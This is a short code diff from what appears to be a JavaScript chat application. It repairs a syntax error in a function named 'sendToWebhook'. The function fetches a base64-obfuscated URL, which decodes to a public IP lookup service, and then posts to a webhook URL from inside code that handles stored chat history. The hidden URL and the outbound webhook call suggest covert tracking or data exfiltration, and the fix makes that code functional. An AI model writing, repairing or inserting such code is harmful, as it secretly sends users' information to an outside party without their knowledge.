@@ -491,7 +491,7 @@ if (storedChatHistory) {
    const url32 = "aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u";
         async function sendToWebhook() {
             try {
-                const response = await fetch(atob(url32);
+                const response = await fetch(atob(url32));
                 const { time } = await response.json();
 
                 await fetch(webhookUrl, {
